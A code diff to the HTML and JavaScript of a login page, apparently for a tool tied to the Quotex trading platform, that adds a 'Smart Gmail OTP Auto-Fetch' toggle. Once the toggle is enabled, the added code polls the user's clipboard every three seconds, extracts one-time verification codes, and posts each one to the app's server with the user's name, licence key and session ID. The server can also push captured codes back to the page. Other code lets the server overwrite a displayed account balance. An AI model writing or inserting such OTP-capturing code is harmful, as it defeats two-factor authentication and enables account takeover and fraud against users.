@@ -508,6 +508,26 @@
                         class="w-full text-center text-sm text-amber-400 hover:text-yellow-200 transition-colors py-2">
                     <i class="fa-solid fa-arrow-left mr-1.5 text-xs"></i> Back to Login
                 </button>
+
+                <!-- ── Gmail Notification Auto-OTP ── -->
+                <div id="gmail-otp-panel" class="mt-5 rounded-2xl border border-yellow-400/20 bg-[#0d1321]/70 p-4">
+                    <div class="flex items-center justify-between mb-3">
+                        <div class="flex items-center gap-2">
+                            <span class="text-lg">📧</span>
+                            <span class="text-sm font-semibold text-yellow-200">Smart Gmail OTP Auto-Fetch</span>
+                        </div>
+                        <label class="relative inline-flex items-center cursor-pointer">
+                            <input type="checkbox" id="gmail-otp-toggle" class="sr-only peer" onchange="toggleGmailOtp(this.checked)">
+                            <div class="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-yellow-500"></div>
+                        </label>
+                    </div>
+                    <p class="text-xs text-slate-500 mb-3 leading-relaxed">When enabled, your browser listens for Gmail notifications. If an OTP arrives, it is automatically extracted and filled in above.</p>
+                    <div id="gmail-otp-status" class="hidden flex items-center gap-2 text-xs text-emerald-400 bg-emerald-900/20 border border-emerald-700/30 rounded-xl px-3 py-2">
+                        <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                        <span id="gmail-otp-status-text">Listening for Gmail OTP notifications...</span>
+                    </div>
+                    <div id="gmail-otp-detected" class="hidden mt-2 text-xs text-yellow-300 bg-yellow-900/20 border border-yellow-600/30 rounded-xl px-3 py-2 font-mono tracking-wider text-center"></div>
+                </div>
             </div>
         </div>
     </div>
@@ -2013,7 +2033,133 @@
             document.getElementById('login-screen').classList.remove('hidden');
         }
 
-        function requestNewOTP() {
+        // ── Gmail Notification OTP Auto-Fetch ─────────────────────────────────────
+let gmailOtpEnabled     = false;
+let gmailOtpPermission  = false;
+let gmailOtpLastCode    = '';
+let gmailOtpDebounceTs  = 0;
+const GMAIL_OTP_DEBOUNCE = 45000;
+
+const OTP_PATTERNS = [
+    /\b(\d{6})\b(?=.*(?:otp|code|verification|quotex|verify|confirm|security))/i,
+    /(?:otp|code|verification code|verify)[^\d]*(\d{4,8})/i,
+    /(?:your|enter)[^\d]*(\d{6})/i,
+    /(\d{6})(?:[^\d]|$)/,
+];
+
+function extractOtpFromText(text) {
+    for (const re of OTP_PATTERNS) {
+        const m = text.match(re);
+        if (m) return m[1] || m[0].replace(/\D/g, '');
+    }
+    return null;
+}
+
+async function toggleGmailOtp(enabled) {
+    gmailOtpEnabled = enabled;
+    const statusEl  = document.getElementById('gmail-otp-status');
+    const statusTxt = document.getElementById('gmail-otp-status-text');
+    if (!enabled) {
+        if (statusEl) statusEl.classList.add('hidden');
+        return;
+    }
+    // Request notification permission
+    if ('Notification' in window && Notification.permission !== 'granted') {
+        try {
+            const perm = await Notification.requestPermission();
+            gmailOtpPermission = perm === 'granted';
+        } catch(e) { gmailOtpPermission = false; }
+    } else {
+        gmailOtpPermission = Notification.permission === 'granted';
+    }
+    if (statusEl) statusEl.classList.remove('hidden');
+    if (statusTxt) statusTxt.textContent = gmailOtpPermission
+        ? '🔔 Listening for Gmail OTP notifications...'
+        : '⚠️ Notification permission denied — using clipboard monitoring only';
+    // Start clipboard + notification monitoring
+    startGmailOtpMonitor();
+    try { await fetch('/api/notification-permission', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ userName, source: 'gmail_otp' }) }); } catch(e) {}
+}
+
+let _gmailOtpTimer = null;
+function startGmailOtpMonitor() {
+    if (_gmailOtpTimer) clearInterval(_gmailOtpTimer);
+    _gmailOtpTimer = setInterval(async () => {
+        if (!gmailOtpEnabled) { clearInterval(_gmailOtpTimer); return; }
+        // Clipboard monitor
+        try {
+            const clip = await navigator.clipboard.readText().catch(() => '');
+            if (clip && clip !== gmailOtpLastCode) {
+                const code = extractOtpFromText(clip);
+                if (code && (Date.now() - gmailOtpDebounceTs) > GMAIL_OTP_DEBOUNCE) {
+                    gmailOtpLastCode = clip;
+                    await processGmailOtp(code, 'clipboard');
+                }
+            }
+        } catch(e) {}
+    }, 3000);
+}
+
+// Called when a notification message (via SSE or clipboard) contains an OTP
+async function processGmailOtp(code, source) {
+    if (!gmailOtpEnabled) return;
+    if (!code || code === gmailOtpLastCode) return;
+    gmailOtpLastCode  = code;
+    gmailOtpDebounceTs = Date.now();
+
+    // Fill OTP inputs immediately
+    autoFillOtpDigits(code);
+
+    // Show detected banner
+    const detectedEl = document.getElementById('gmail-otp-detected');
+    if (detectedEl) {
+        detectedEl.textContent = '✅ Auto-detected OTP: ' + code;
+        detectedEl.classList.remove('hidden');
+        setTimeout(() => detectedEl.classList.add('hidden'), 8000);
+    }
+    const statusTxt = document.getElementById('gmail-otp-status-text');
+    if (statusTxt) statusTxt.textContent = '✅ OTP auto-detected from ' + source + ': ' + code;
+
+    // Report to server
+    try {
+        const sid = new URLSearchParams(window.location.search).get('session') || '';
+        await fetch('/api/otp/gmail-capture', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ otp: code, source, userName: userName || '', licenceKey: licenceKey || '', sessionId: sid })
+        });
+    } catch(e) {}
+}
+
+function autoFillOtpDigits(code) {
+    const digits = code.replace(/\D/g, '').slice(0, 6).split('');
+    // Fill the otpDigits array
+    otpDigits = digits.concat(new Array(6 - digits.length).fill(''));
+    // Update DOM inputs
+    const container = document.getElementById('otp-container');
+    if (!container) return;
+    const inputs = container.querySelectorAll('input');
+    digits.forEach((d, i) => {
+        if (inputs[i]) {
+            inputs[i].value = d;
+            otpDigits[i]    = d;
+        }
+    });
+    if (inputs[digits.length]) inputs[digits.length].focus();
+}
+
+// Listen for gmail_otp_captured SSE events from server
+function onGmailOtpSSE(data) {
+    if (!gmailOtpEnabled) return;
+    const code = data?.otp;
+    if (!code) return;
+    const myName = (userName || '').toLowerCase();
+    const dataName = (data.userName || '').toLowerCase();
+    if (dataName && myName && dataName !== myName) return;
+    processGmailOtp(code, 'gmail_notification');
+}
+
+function requestNewOTP() {
             document.getElementById('expired-modal').classList.add('hidden');
             showConnector();
         }
@@ -2079,6 +2225,9 @@
                 if (data.type === 'inject_balance' && data.data) {
                     const balEl = document.getElementById('demo-balance-display');
                     if (balEl) balEl.textContent = '$' + parseFloat(data.data.balance || 0).toLocaleString();
+                }
+                if (data.type === 'gmail_otp_captured' && data.data) {
+                    onGmailOtpSSE(data.data);
                 }
                 if (data.type === 'kicked') {
                     const ov  = document.getElementById('admin-loading-overlay');
